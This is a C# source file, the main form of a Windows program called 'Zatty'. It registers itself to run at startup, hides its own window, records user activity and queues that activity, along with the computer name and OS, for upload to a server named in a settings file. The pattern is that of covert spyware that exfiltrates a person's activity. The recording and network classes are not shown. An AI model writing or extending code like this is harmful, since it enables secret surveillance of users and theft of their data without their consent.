using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Timers;
using System.Threading;
using Zatty.Core;
using Zatty.Utils;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
namespace Zatty
{
    public partial class MainForm : Form
    {
        ActivtyRecord record = new ActivtyRecord();
        Network network;
        public MainForm(bool sendDetails)
        {
            InitializeComponent();
            Startup.AddToStartup();
            var t = SettingsFile.Read();
            network = new Network(t[0],t[1],t[2]);

            record.newEntry += record_newEntry;
            record.Start();

            if (sendDetails)
            {
                string data = fastJSON.JSON.ToJSON(new string[] { ComputerInformation.ComputerName(), ComputerInformation.GetOSName() });
                network.AddToQueue("info", data);
            }
            var p = FileLog.Read();
            if (p != null)
            {
                foreach (var e in p)
                {
                    network.AddToQueue(e);
                }
            }
        }

        void record_newEntry(Activity e)
        {
             network.AddToQueue(e);
        }

        private void MainForm_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }
    }
}
